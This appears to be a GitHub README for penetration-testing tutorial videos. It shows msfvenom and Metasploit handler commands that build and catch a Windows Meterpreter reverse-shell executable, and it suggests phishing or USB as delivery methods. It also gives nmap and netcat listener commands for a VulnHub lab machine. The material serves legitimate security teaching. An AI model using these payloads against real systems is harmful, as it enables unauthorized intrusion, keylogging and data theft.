# Overview
This repository contains two instructional videos that demonstrate penetration testing techniques. The first video covers generating a Meterpreter payload with Metasploit, and the second video demonstrates exploiting the Jangow virtual machine from VulnHub to gain root access. These videos are intended solely for educational purposes in ethical hacking and authorized penetration testing scenarios.
--
## Video 1: Generating a Meterpreter Payload with Metasploit
https://github.com/user-attachments/assets/18f45dda-cb96-4489-96e9-89557210a9a5
### Description
This video demonstrates how to use the Metasploit Framework to generate a malicious Windows Meterpreter payload and exploit a target system. It guides you through the process of setting up a listener, delivering the payload, and using the Meterpreter session for post-exploitation activities.
### Set Up the Listener
Open Metasploit and configure the multi-handler exploit to wait for the incoming connection from the payload.
### Steps
1. **Generate the Payload**  
   We use `msfvenom` to create a malicious Windows executable that establishes a reverse shell connection.
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe > payload.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT <your-port>
exploit

### Deliver the Payload
Transfer the payload.exe file to the target system using a suitable method (e.g., USB, phishing).

Establish a Meterpreter Session
When the payload is executed on the target, a Meterpreter session is established. This allows for advanced post-exploitation tasks such as file access, keylogging, and privilege escalation.




## Video 2: Exploiting the Jangow VM from VulnHub

https://github.com/user-attachments/assets/30f381ed-42e2-4599-830c-6dd8d6865c73

### Description
In this video, we demonstrate the exploitation of the Jangow VM from VulnHub. The goal is to identify vulnerabilities, gain a reverse shell, and escalate privileges to root. The video simulates a real-world penetration testing workflow.

#### Steps
1. Reconnaissance and Scanning
Use nmap to scan the target for open ports and services.
nmap -sC -sV -oN scan.txt <target-ip>

Analyze the results to identify potential attack vectors.
2. Exploitation
Based on the scan, identify vulnerabilities in services running on the target machine.
Craft or use a suitable exploit to gain initial access. For example:
nc -lvnp <your-port>
